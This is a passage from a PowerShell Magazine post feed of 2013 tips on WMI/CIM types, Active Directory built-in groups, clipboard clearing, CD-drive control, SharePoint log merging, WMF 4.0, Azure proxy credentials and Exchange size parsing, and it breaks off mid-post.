","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/09/secure-parameter-validation-in-powershell/","tags":["How To"],"title":"Secure Parameter Validation in PowerShell"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIf you get a list of CIM class properties you’ll notice the CimType property.\nPS\u0026gt; $class = Get-CimClass -ClassName Win32_Process $class.CimClassProperties | Format-Table Name,CimType Name CimType ---- ------- Caption String Description String InstallDate DateTime Name String Status String CreationClassName String CreationDate DateTime CSCreationClassName String CSName String ExecutionState UInt16 Handle String KernelModeTime UInt64 OSCreationClassName String OSName String Priority UInt32 TerminationDate DateTime UserModeTime UInt64 WorkingSetSize UInt64 CommandLine String ExecutablePath String HandleCount UInt32 (...) The CimType property specifies a CIM type, such as integer, string, or datetime. The CimConverter class allows us to convert CIM types to the equivalent .NET type using the GetDotNetType static method. The following snippet lists the values of the CimType enum and creates a table of the CIM type and its .NET equivalent.\n[Microsoft.Management.Infrastructure.CimType].GetEnumNames() | ForEach-Object { [PSCustomObject]@{ CimType = $_ NetType = [Microsoft.Management.Infrastructure.CimConverter]::GetDotNetType($_) } } CimType NetType ------- ------- Unknown Boolean System.Boolean UInt8 System.Byte SInt8 System.SByte UInt16 System.UInt16 SInt16 System.Int16 UInt32 System.UInt32 SInt32 System.Int32 UInt64 System.UInt64 SInt64 System.Int64 Real32 System.Single Real64 System.Double Char16 System.Char DateTime String System.String Reference Microsoft.Management.Infrastructure.CimInstance Instance Microsoft.Management.Infrastructure.CimInstance BooleanArray System.Boolean[] UInt8Array System.Byte[] SInt8Array System.SByte[] UInt16Array System.UInt16[] SInt16Array System.Int64[] UInt32Array System.UInt32[] SInt32Array System.Int32[] UInt64Array System.UInt64[] SInt64Array System.Int64[] Real32Array System.Single[] Real64Array System.Double[] Char16Array System.Char[] DateTimeArray StringArray System.String[] ReferenceArray Microsoft.Management.Infrastructure.CimInstance[] InstanceArray Microsoft.Management.Infrastructure.CimInstance[] The GetCimType static method allows us to go the other direction and convert a .NET type to CIM type. A value of ‘Unknown’ is returned if the mapping is ambiguous.\n[Microsoft.Management.Infrastructure.CimConverter]::GetCimType('int') SInt32   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/06/pstip-converting-net-types-to-cim-types-and-vice-versa/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Converting .NET types to CIM types and vice versa"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe WMI class Win32_Share gives us the information about all network shares that exist on the local machine. Now, how do we check if a given folder is shared or not?\nWe can use the Win32_Share WMI class and query for a specific path! I have put this simple logic in a function.\nFunction IsFolderShared { [CmdletBinding()] param ( [Parameter( ValueFromPipeLine, ValueFromPipelineByPropertyName, Mandatory )] [alias(\u0026quot;FullName\u0026quot;)] [String[]]$Path ) Process { foreach ($Folder in $Path) { $WMIFolderPath = $Folder -replace '\\\\','\\\\' [PSCustomObject] @{ \u0026quot;FolderPath\u0026quot; = $Folder \u0026quot;IsShared\u0026quot; = if (Get-CimInstance -Query \u0026quot;SELECT * FROM Win32_Share WHERE Path='$WMIFolderPath'\u0026quot;) { $true } else { $false } } } } }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/27/pstip-check-if-a-folder-is-shared/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Check if a folder is shared"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nSome of the WMI queries require that we specify the folder path with an escaped path separator. For example, take a look at the following error.\nSo, we need to escape the path separator for the above query to work.\nWhen we are running such queries programmatically for user provided input, we need a better way to convert the path to WMI compatible path.\nHere is the trick I use.\n'C:\\Windows' -replace \"\\\\\",\"\\\\\"  How do you do it?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/26/pstip-convert-a-path-to-wmi-compatible-path/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Convert a path to WMI compatible path"},{"categories":["How To","Active Directory"],"contents":"Built-in groups are predefined security groups, defined with domain local scope, that are created automatically when you create an Active Directory domain. You can use these groups to control access to shared resources and delegate specific domain-wide administrative roles. Built-in groups are located under the Builtin container. One way to list all built-in groups is to get all groups from the Builtin container.\nPS\u0026gt; Get-ADGroup -SearchBase 'CN=Builtin,DC=domain,DC=com' -Filter * | Format-Table Name,GroupScope,GroupCategory,SID Name GroupScope GroupCategory SID ---- ---------- ------------- --- Network Configuration Operators DomainLocal Security S-1-5-32-556 Incoming Forest Trust Builders DomainLocal Security S-1-5-32-557 Distributed COM Users DomainLocal Security S-1-5-32-562 Guests DomainLocal Security S-1-5-32-546 Performance Log Users DomainLocal Security S-1-5-32-559 Performance Monitor Users DomainLocal Security S-1-5-32-558 Pre-Windows 2000 Compatible Access DomainLocal Security S-1-5-32-554 Terminal Server License Servers DomainLocal Security S-1-5-32-561 Users DomainLocal Security S-1-5-32-545 Windows Authorization Access Group DomainLocal Security S-1-5-32-560 Remote Desktop Users DomainLocal Security S-1-5-32-555 Replicator DomainLocal Security S-1-5-32-552 Print Operators DomainLocal Security S-1-5-32-550 Administrators DomainLocal Security S-1-5-32-544 Backup Operators DomainLocal Security S-1-5-32-551 Account Operators DomainLocal Security S-1-5-32-548 Server Operators DomainLocal Security S-1-5-32-549 IIS_IUSRS DomainLocal Security S-1-5-32-568 Cryptographic Operators DomainLocal Security S-1-5-32-569 Event Log Readers DomainLocal Security S-1-5-32-573 Certificate Service DCOM Access DomainLocal Security S-1-5-32-574 Power Users Global Security S-1-5-21-33041744-1045339714-1466953526-11229 Although groups in the Builtin container cannot be moved to another location, other group types are found in that location. From the above output you can see that the ‘Power Users’ group is not a ‘pure’ built-in group. Another way to list built-in groups is to filter them by a portion of their SID value:\nPS\u0026gt; Get-ADGroup -ResultSetSize $null -Filter * -Properties GroupType | Where-Object {$_.SID -like \u0026quot;S-1-5-32-*\u0026quot;} | Format-Table Name,GroupScope,GroupCategory,GroupType,SID Name GroupScope GroupCategory GroupType SID ---- ---------- ------------- --------- --- Network Configuration Operators DomainLocal Security -2147483643 S-1-5-32-556 Incoming Forest Trust Builders DomainLocal Security -2147483643 S-1-5-32-557 Distributed COM Users DomainLocal Security -2147483643 S-1-5-32-562 Guests DomainLocal Security -2147483643 S-1-5-32-546 Performance Log Users DomainLocal Security -2147483643 S-1-5-32-559 Performance Monitor Users DomainLocal Security -2147483643 S-1-5-32-558 Pre-Windows 2000 Compatible Access DomainLocal Security -2147483643 S-1-5-32-554 Replicator DomainLocal Security -2147483643 S-1-5-32-552 Print Operators DomainLocal Security -2147483643 S-1-5-32-550 Administrators DomainLocal Security -2147483643 S-1-5-32-544 Backup Operators DomainLocal Security -2147483643 S-1-5-32-551 Account Operators DomainLocal Security -2147483643 S-1-5-32-548 Server Operators DomainLocal Security -2147483643 S-1-5-32-549 Windows Authorization Access Group DomainLocal Security -2147483643 S-1-5-32-560 Terminal Server License Servers DomainLocal Security -2147483643 S-1-5-32-561 Users DomainLocal Security -2147483643 S-1-5-32-545 Remote Desktop Users DomainLocal Security -2147483643 S-1-5-32-555 Cryptographic Operators DomainLocal Security -2147483643 S-1-5-32-569 IIS_IUSRS DomainLocal Security -2147483643 S-1-5-32-568 Event Log Readers DomainLocal Security -2147483643 S-1-5-32-573 Certificate Service DCOM Access DomainLocal Security -2147483643 S-1-5-32-574 This method is not the most efficient one because it first gets ALL groups from the directory (depending on the size of your environment that can take some time to finish) and only then filters them by their SID. We could try and filter them using the Filter parameter (e.g Get-ADGroup -Filter {SID -like “S-1-5-32-*”}) but filtering by SID on the server is not supported and doesn’t yield a result.\nSo, how can we get all the groups in an efficient manner and make sure we get built-in groups only? First, let’s find out what makes a group a built-in group. We will investigate the groupType value of the groups (see output above). The groupType value is a combination of flags that determine the type of the group.\n   Symbolic name Value     GROUP_TYPE_BUILTIN_LOCAL_GROUP 0x00000001   GROUP_TYPE_ACCOUNT_GROUP 0x00000002   GROUP_TYPE_RESOURCE_GROUP 0x00000004   GROUP_TYPE_UNIVERSAL_GROUP 0x00000008   GROUP_TYPE_APP_BASIC_GROUP 0x00000010   GROUP_TYPE_APP_QUERY_GROUP 0x00000020   GROUP_TYPE_SECURITY_ENABLED 0x80000000    The groupType AD property returns a numeric value but using ADSI Edit (adsiedit.msc) you can get a visual representation of the flags.\nAs you can see the Administrators group type is marked with three attributes: _ GROUP_TYPE_BUILTIN_LOCAL_GROUP, GROUP_TYPE_RESOURCE_GROUP_, and _GROUP_TYPE_SECURITY_ENABLED_. These attributes translates to the flags in the figure above.\nPS\u0026gt; $GROUP_TYPE_BUILTIN_LOCAL_GROUP = 0x00000001 PS\u0026gt; $GROUP_TYPE_RESOURCE_GROUP = 0x00000004 PS\u0026gt; $GROUP_TYPE_SECURITY_ENABLED = 0x80000000 PS\u0026gt; $groupType = $GROUP_TYPE_BUILTIN_LOCAL_GROUP + $GROUP_TYPE_RESOURCE_GROUP + $GROUP_TYPE_SECURITY_ENABLED PS\u0026gt; $groupType -2147483643 PS\u0026gt; '0x{0:x}' -f $groupType 0x80000005 In the case of built-in groups, they all have the same attributes applied so you could list them using the Filter parameter with the following command:\nGet-ADGroup -Filter {GroupType -eq -2147483643} That’s much more efficient than using a Where-Object command but it gets us all groups with all of those attributes defined together. If you want to test if a group has the BUILTIN_LOCAL_GROUP flag turned on, you can do that using the bitwise AND (-bAnd) operator.\nGet-ADGroup -Filter {GroupType -band 1}  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/26/identifying-active-directory-built-in-groups-with-powershell/","tags":["Active Directory","How To"],"title":"Identifying Active Directory built-in groups with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nHave you ever wondered how to clear the contents of the clipboard? There are certainly many ways to do that in PowerShell. Let us see a couple of them.\necho $null | clip.exe  The above snippet is the most trivial. Then, we can use the .NET way of doing it.\nAdd-Type -AssemblyName System.Windows.Forms [System.Windows.Forms.Clipboard]::Clear()  The above snippet needs the Windows Forms namespace to clear the clipboard. Note that you don’t need to add the assembly if you are running the above snippet in PowerShell ISE. We can also use the native Win32 API – EmptyClipboard. This is slightly complex and requires either Pinvoke or .NET Interop.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/13/pstip-clear-clipboard-content/","tags":["Tips and Tricks"],"title":"#PSTip Clear clipboard content"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nI came across a project on Github (nothing related to PowerShell though) that provides a web-based UI for running system commands. This is based on Node.js implementation and does not support Windows platform yet. So, I was thinking about adding some PowerShell support.\nI started discussing this with a few folks and they suggested an alternative for running system commands on Windows. While looking at that, I stumbled upon the CDROM eject and close commands supported by this 3rd-party tool. I wanted to see how easy that is to do in PowerShell. So, here is what I came up with.\nAdd-Type -TypeDefinition @' using System; using System.Runtime.InteropServices; using System.ComponentModel; namespace CDROM { public class Commands { [DllImport(\u0026quot;winmm.dll\u0026quot;)] static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback); public static void Eject() { string rt = \u0026quot;\u0026quot;; mciSendString(\u0026quot;set CDAudio door open\u0026quot;, rt, 127, IntPtr.Zero); } public static void Close() { string rt = \u0026quot;\u0026quot;; mciSendString(\u0026quot;set CDAudio door closed\u0026quot;, rt, 127, IntPtr.Zero); } } } '@ [CDROM.Commands]::Eject() [CDROM.Commands]::Close()  The above snippet uses the .NET interop namespace to invoke a Win32 API for working with multimedia devices. Btw, I came across several blog posts on using WScript Shell and Windows Media Player OCX to achieve this task. But, like I mentioned, this is more PowerShell way of doing it. Drop a comment if you are aware of any alternative methods.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/12/pstip-ejecting-and-closing-cdrom-drive-the-powershell-way/","tags":["Tips and Tricks"],"title":"#PSTip Ejecting and closing CDROM drive–the PowerShell way!"},{"categories":["News","HPE","Module Spotlight"],"contents":"HP has released a PowerShell module HPiLOCmdlets, designed to help IT experts to configure and manage HP iLO 3 and iLO 4 using Windows PowerShell. The HP iLO module is a set of a 110 functions that provides out-of-band automation from a Windows management workstation directly to iLO systems.\nFeatures of the module include:\n Sending commands to multiple iLOs Finding iLO systems by searching IP addresses Access to information available from iLO systems, including configuration settings, power state and settings, system health, IML and iLO event logs, and many more Setting configurable iLO settings in scripts  You cannot update iLO firmware with this release.\nThe module requires Windows Management Framework 3.0 and is supported on the following operating systems:\n• Microsoft Windows 7 SP1\n• Microsoft Windows 8\n• Microsoft Windows Server 2008 R2 SP1\n• Microsoft Windows Server 2012\nAn installation file is available for both 64-bit and 32-bit systems. A 21-page user guide can be downloaded from HERE.\nThere’s one major drawback with the module–it cannot be discovered (on two x64 bit systems I tested on: Windows 7 and Windows 8.1). The installation creates the module under the C:\\Program Files\\Hewlett-Packard\\PowerShell\\Modules\\HPiLOCmdlets folder. The path of the folder is not visible during installation and the installation process doesn’t update the path in the $env:PSModulePath variable.\nUntil this gets fixed you might want to save yourself some typing each time you want to use the module and add this line to your profile file so it can be easily discovered with Get-Help, Get-Module, Get-Command or any other discovery cmdlet:\n$env:PSModulePath+=\";$env:ProgramFiles\\Hewlett-Packard\\PowerShell\\Modules\"  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/12/hp-scripting-tools-for-windows-powershell/","tags":["HPE","Modules","News"],"title":"HP Scripting Tools for Windows PowerShell"},{"categories":["SharePoint","Tips and Tricks"],"contents":"Note: This tip requires SharePoint 2010 or above.\nWhenever there’s a problem in SharePoint 2010 you are most likely using the ULS Viewer application to collect trace logs for further details about the problem in question or to monitor machines and the events they create in real-time. ULS Viewer shows information from the server it was launched from. In the case where your farm is behind a load balancer, you can’t be sure on which server the error occurs and you need to manually process the logs from each server. This can be a very daunting task, especially if your farm contains large number of servers!\nLuckily we don’t need to work that hard–there’s a SharePoint cmdlet we can use to gather log information from all farm servers into a single log file which then can be parsed by the ULS Viewer, the Merge-SPLogFile cmdlet. To optimize the performance of this cmdlet it is advised to filter and narrow the results as much as you can by using the parameters of the command (e.g StartTime, EndTime, EventID, etc).\nIn the following example I’m using Merge-SPLogFile to combine trace log entries created in the last 15 minutes, from all farm servers, into a single log file on the local computer:\n$StartTime = (Get-Date).AddMinutes(-15) Merge-SPLogFile -Path D:\\Logs\\FarmMergedLog.log -Overwrite -StartTime $StartTime  See the Server column to tell from which server an event came from. If the Server column is empty (some viewer application are not capable of displaying it), you can find the server name in the Process column.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/05/pstip-how-to-combine-trace-log-entries-from-all-sharepoint-farm-servers-using-powershell/","tags":["Tips and Tricks","SharePoint"],"title":"#PSTip How to combine trace log entries from all SharePoint farm servers using PowerShell"},{"categories":["News"],"contents":"For the past 5 years, PowerShell MVP Tobias Weltner has published a daily tip on powershell.com. Together with fellow MVP Aleksandar Nikolic, he’s started revising and compiling this huge tips collection for you and came up with ready-to-use pocket guides of PowerShell knowledge. Grab your free PowerShell concentrate on topics like “File System Tasks”, “WMI”, “Dates and Times”, or “Regular Expressions”.\nHead over to http://powershell.com/cs/media/28/default.aspx and download the files.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/11/05/powertips-monthly-powershell-reference-library/","tags":["News"],"title":"PowerTips Monthly: PowerShell Reference Library"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier post, I wrote about compressing / uncompressing files using WMI. Towards the end of that article, the image showed the difference in file size on disk before and after the compression. So, how can we retrieve that value using PowerShell? Let us look at Get-Item and WMI to see if we can retrieve the file size on disk.\nnamespace Disk { public class SizeInfo { [DllImport(\u0026quot;kernel32.dll\u0026quot;, SetLastError=true, EntryPoint=\u0026quot;GetCompressedFileSize\u0026quot;)] static extern uint GetCompressedFileSizeAPI(string lpFileName, out uint lpFileSizeHigh); public static ulong GetCompressedFlieSize(string FileName,bool SizeInMB) { uint HighOrder; uint LowOrder; LowOrder = GetCompressedFileSizeAPI(FileName, out HighOrder); int error = Marshal.GetLastWin32Error(); if (HighOrder == 0 \u0026amp;\u0026amp; LowOrder == 0xFFFFFFFF \u0026amp;\u0026amp; error != 0) throw new Win32Exception(error); else if (SizeInMB) return ((((ulong)HighOrder \u0026amp;lt;\u0026amp;lt; 32) + LowOrder)/1024)/1024; else return ((ulong)HighOrder \u0026amp;lt;\u0026amp;lt; 32) + LowOrder; } } } `@  The above snippet will create the Disk.SizeInfo namespace in the current PowerShell session. We can use this namespace to retrieve the file size on disk.\n[Disk.SizeInfo]::GetCompressedFlieSize( \u0026quot;C:\\scripts\\test.vhd\u0026quot;,$false) [Disk.SizeInfo]::GetCompressedFlieSize( \u0026quot;C:\\scripts\\test.vhd\u0026quot;,$true) If the second parameter is set to $true, the value of the file size will be returned in megabytes.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/31/pstip-get-the-size-of-a-file-on-disk/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Get the size of a file on disk"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWindows provides access to many folders of the current user via the SpecialFolders collection. A special folder can point to standard directories (e.g Favorites) or to a “virtual” folder (e.g My Computer). The SpecialFolders collection lists the identifiers (constants) and the contents (path) of each of the special folders in the SpecialFolders collection. The locations of these folders can have different values on different operating systems (and can be changed by the user).\nThe Environment.SpecialFolder enumeration specifies all constants used to retrieve directory paths to system special folders. Special folders are set by default by the system, or explicitly by the user, when installing a version of Windows. Your result may vary based on your OS and the installed .NET version.\nPS\u0026gt; [Enum]::GetNames('System.Environment+SpecialFolder') Desktop Programs MyDocuments Personal Favorites Startup Recent SendTo StartMenu (...)  Using the Environment.GetFolderPath static method we can get the physical path of a folder, pass an enumeration as an argument:\nPS\u0026gt; [Environment]::GetFolderPath([System.Environment+SpecialFolder]::MyDocuments) C:\\Users\\shay\\Documents  Or let PowerShell do the convertion for you by passing just the constant name:\nPS\u0026gt; [Environment]::GetFolderPath('MyDocuments') C:\\Users\\shay\\Documents  What if you don’t remember all constants? With the Get-SpecialFolder function you are worry free. Get-SpecialFolder provides an easy and convenient way to work with special folders. It lists all folders (or just a subset) that have a physical path and returns a custom object. All folder constants are properties of the resultant object and you can use IntelliSense to cycle through all of them.\nfunction Get-SpecialFolder { [CmdletBinding()] [OutputType('System.Management.Automation.PSCustomObject')] param( [string]$Name='*' ) $pso = New-Object -TypeName PSObject $folders = [System.Enum]::GetNames('System.Environment+SpecialFolder') $folders | Where-Object {$_ -like $Name} | Sort-Object | ForEach-Object { if($folderPath = [System.Environment]::GetFolderPath($_)) { $pso | Add-Member -MemberType NoteProperty -Name $_ -Value $folderPath } } $pso }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/30/pstip-working-with-special-folders/","tags":["Tips and Tricks"],"title":"#PSTip Working with Special Folders"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn WMI, the CIM_DataFile and CIM_Directory classes have some very useful methods we can use. For example, the Compress() and the Uncompress() methods can be used to reduce the on-disk footprint of a file or a folder. Essentially, think of this as a poor man’s compression toolkit! These methods use NTFS compression.\nIn today’s tip, I will show you how you can use these methods to work with file/folder compression. There are multiple ways we can invoke WMI methods in PowerShell. For the purpose of this tip, I will stick to calling the methods on a WMI object using the dotted notation.\n$file = Get-WmiObject -Query \"SELECT * FROM CIM_DataFile WHERE Name='C:\\\\scripts\\\\test.vhd'\" $file.Compress()  The above code snippet compresses the file. To uncompress, we simply use the the Uncompress() method.\n$file = Get-WmiObject -Query \"SELECT * FROM CIM_DataFile WHERE Name='C:\\\\scripts\\\\test.vhd'\" $file.Uncompress()  The Compressed property of CIM_DataFile instance tells us if the file is compressed or not.\nTo see if a file is really compressed or not, we can verify its size on the disk.\nNow, how do we compress a folder? Simple. We use the Compress() method of a CIM_Directory instance.\n$folder = Get-WmiObject -Query \u0026quot;SELECT * FROM CIM_Directory WHERE Name='C:\\\\scripts'\u0026quot; $folder.Compress() ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/28/pstip-compress-and-uncompress-files-and-folders-using-wmi/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Compress and uncompress files and folders using WMI"},{"categories":["News"],"contents":"Windows Management Framework 4.0 is available for installation on Windows 7 SP1, Windows Server 2008 R2 SP1, Windows Server 2012, and Windows Embedded 7. WMF 4.0 cannot be installed on Windows 8. However, you can obtain the updated functionality included in WMF 4.0 by installing Windows 8.1, which is available as a free update for Windows 8.\nWMF 4.0 contains updated versions of the following features:\n Windows PowerShell Windows PowerShell Integrated Scripting Environment (ISE) Windows PowerShell Web Services (Management OData IIS Extension) Windows Remote Management (WinRM) Windows Management Infrastructure (WMI) Windows PowerShell Desired State Configuration (DSC)  Along with the packages for each operating system, a set of release notes and an additional DSC quick reference is provided. Make sure to read the release notes doc as it contains useful information about new features, as well as a list of known issues with their workarounds and known incompatibilities with other applications. We encourage you to download and read them both.\n Windows Management Framework 4.0 Release Notes.docx Desired State Configuration Quick Reference for Windows Management Framework 4.0.pdf Desired State Configuration Quick Reference for Windows Management Framework 4.0.pptx  IMPORTANT: Not all Microsoft server applications are currently compatible with WMF 4.0. Before installing WMF 4.0, be sure to read the WMF 4.0 Release Notes. Specifically, systems that are running the following server applications should not run WMF 4.0 at this time:\n System Center 2012 Configuration Manager (not including SP1) System Center Virtual Machine Manager 2008 R2 (including SP1) Microsoft Exchange Server 2013, Microsoft Exchange Server 2010 and Microsoft Exchange Server 2007 Microsoft SharePoint 2013 and Microsoft SharePoint 2010 Windows Small Business Server 2011 Standard  Microsoft acknowledges that there is still a need for management of Windows Server 2008, and Windows Management Framework 3.0 remains the answer for Windows Server 2008.\n  Finally, check out these WMF 4.0-related KB articles:   Description of WMF 4.0 for Windows 7 SP1, Windows Embedded Standard 7 SP1, and Windows Server 2008 R2 SP1 http://support.microsoft.com/kb/2819745\n  Description of WMF 4.0 for Windows Server 2012\nhttp://support.microsoft.com/kb/2799888\n  Update is available that prevents the PSModulePath environment variable from being reset when you upgrade WMF 3.0 to WMF 4.0 and then uninstall WMF 4.0 in Windows\nhttp://support.microsoft.com/kb/2872047\n  Update prevents the “PSModulePath” environment variables from being reset after you uninstall WMF 4.0 in Windows http://support.microsoft.com/kb/2872035\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/25/windows-management-framework-4-0-is-now-available/","tags":["News"],"title":"Windows Management Framework 4.0 is now available!"},{"categories":["Azure","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nA few days ago, I was working on setting up Kemp Azure VLM. I will talk about this more in a detailed post later.\nSo, as part of this process, I had to upload the Kemp Azure VLM VHD to my Azure storage using Azure PowerShell cmdlets. However, my home proxy was not letting me do that and there was no way to provide proxy credentials when using Azure cmdlets. So, essentially, things like Add-AzureVHD will fail with a 407 error.\nPS C:\\\u0026gt; Add-AzureVhd -LocalFilePath C:\\Scripts\\LoadMaster-VLM-7.0-3-Azure.vhd -Destination \"http://mystorage.blob.core.window s.net/kemp/kempvlm.vhd\" Add-AzureVhd : \"An exception occurred when calling the ServiceManagement API. HTTP Status Code: 407. Service Management Error Code: \u0026lt;NONE\u0026gt;. Message: \u0026lt;NONE\u0026gt;. Operation Tracking ID: \u0026lt;NONE\u0026gt;.\" At line:1 char:1 + Add-AzureVhd -LocalFilePath C:\\Scripts\\LoadMaster-VLM-7.0-3-Azure.vhd -Destination ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : CloseError: (:) [Add-AzureVhd], ServiceManagementClientException + FullyQualifiedErrorId : Microsoft.WindowsAzure.Management.ServiceManagement.StorageServices.AddAzureVhdCommand  That is not a very friendly message but there is an easy way to resolve the problem with a little help of .NET:\n[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials  The DefaultCredentials property of System.Net.CredentialCache represents the current security context in which the application is running. For a client-side application, these are usually the Windows credentials (user name, password, and domain) of the user running the application.\nPS C:\\\u0026gt; Add-AzureVhd -LocalFilePath C:\\Scripts\\LoadMaster-VLM-7.0-3-Azure.vhd -Destination \"http://mystorage. blob.core.windows.net/kemp/kemp.vhd\" -Verbose MD5 hash is being calculated for the file C:\\Scripts\\LoadMaster-VLM-7.0-3-Azure.vhd. MD5 hash calculation is completed. Elapsed time for the operation: 00:01:40 Creating new page blob of size 34359738880... Upload failed with exceptions: Elapsed time for upload: 00:06:50  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/22/pstip-azure-cmdlets-and-proxy-authentication/","tags":["Azure","Tips and Tricks"],"title":"#PSTip Azure cmdlets and proxy authentication"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires Windows 8.1 or above.\nThe Power user menu (Win+X keyboard shortcut) introduced in Windows 8 provides quick access to various admin tools.\nStarting in Windows 8.1 you can now replace the Command Prompt menu entries with PowerShell. Right-click the Taskbar \u0026gt; Go to Properties and then to the Navigation tab.\nAfter you check the option the menu will look like:\nExplore the other options on the navigation tab; a few new options has been added to 8.1.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/21/pstip-windows-8-1-winx-menu-powershell-in-command-prompt-out/","tags":["Tips and Tricks"],"title":"#PSTip Windows 8.1 Win+X Menu: PowerShell in, Command Prompt out!"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn WMI, a namespace is a collection of classes. There are many WMI namespaces on a system and each namespace might contain more namespaces. Each WMI namespace is an instance of __NAMESPACE system class. So, we can use Get-WmiObject cmdlet to list all WMI namespaces on a system.\nGet-WmiObject -Class __NAMESPACE | select Name  But since Get-WmiObject defaults to root\\cimv2 namespace, we get namespaces under root\\cimv2 namespace only.\nHere is a simple function that helps you get all WMI namespaces on a system in a recursive manner.\nFunction Get-WmiNamespace { Param ( $Namespace='root' ) Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object { ($ns = '{0}\\{1}' -f $_.__NAMESPACE,$_.Name) Get-WmiNamespace $ns } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/","tags":["Tips and Tricks","WMI"],"title":"#PSTip List all WMI namespaces on a system"},{"categories":["PowerShell DSC","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nIn Windows Server 2012 R2 RTM build, Microsoft added a cmdlet called Get-DSCResource. This cmdlet helps us explore the DSC resources available on the local computer.\nThe ImplementedAs property of the DSC resource tells us whether it is a PowerShell Script module or a Binary module.\nThe “Properties” property of a DSC resource tell us what attributes can be used as a part of the configuration document.\nIf we don’t know how to use the attributes of a DSC resource in a configuration document, we can use the –Syntax switch parameter of the Get-DSCResource cmdlet.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/09/pstip-exploring-dsc-resources/","tags":["Tips and Tricks","PowerShell DSC"],"title":"#PSTip Exploring DSC resources"},{"categories":["Tips and Tricks"],"contents":"You have been tasked to generate a report of mailbox sizes and you quickly write the following:\nGet-MailboxDatabase | Get-MailboxStatistics | Select-Object DisplayName,TotalItemSize | Export-Csv .\\MailboxSize.csv -NoTypeInformation A week after, your manager asks you to re-format the size to another size unit (KB,MB,GB, and so on). You open the file and see that the size of each mailbox is looking similar to: 1006 MB (1,055,195,632 bytes). See the problem?\nThe size you have in the CSV file is a string and you need to gather your string parsing-fu to convert it; neither an easy nor fun task! Luckily, Exchange has a special type, ByteQuantifiedSize, you can use to parse the string and it even allows you to convert the result between the size units. Note that the ByteQuantifiedSize Type is available only in the Exchange Management Shell (EMS), it will not work in an implicit remoting session made to the PowerShell IIS directory on your Exchange server (thanks @mjolinor).\nPS\u0026gt; [Microsoft.Exchange.Data.ByteQuantifiedSize]::Parse('1006 MB (1,055,195,632 bytes)') 1006 MB (1,055,195,632 bytes) At first glance, nothing happened when you parsed the string but what you see on screen is just the string representation of the size object. Here are the interesting bits…\nPS\u0026gt; [Microsoft.Exchange.Data.ByteQuantifiedSize]::Parse('1006 MB (1,055,195,632 bytes)') | Get-Member TypeName: Microsoft.Exchange.Data.ByteQuantifiedSize Name MemberType Definition ---- ---------- ---------- CompareTo Method int CompareTo(Microsoft.Exchange.Data.ByteQuantifiedSize other) Equals Method bool Equals(System.Object obj), bool Equals(Microsoft.Exchange.Data.ByteQuantifiedSize other) GetHashCode Method int GetHashCode() GetType Method type GetType() RoundUpToUnit Method System.UInt64 RoundUpToUnit(Microsoft.Exchange.Data.ByteQuantifiedSize+Quantifier quantifier) ToBytes Method System.UInt64 ToBytes() ToGB Method System.UInt64 ToGB() ToKB Method System.UInt64 ToKB() ToMB Method System.UInt64 ToMB() ToString Method string ToString(), string ToString(string format), string ToString(string format, System.IF... ToTB Method System.UInt64 ToTB() Notice the _To*_ methods. We can use them to convert to other units.\nPS\u0026gt; $size = [Microsoft.Exchange.Data.ByteQuantifiedSize]::Parse('1006 MB (1,055,195,632 bytes)') PS\u0026gt; $size.ToKB() 1030464  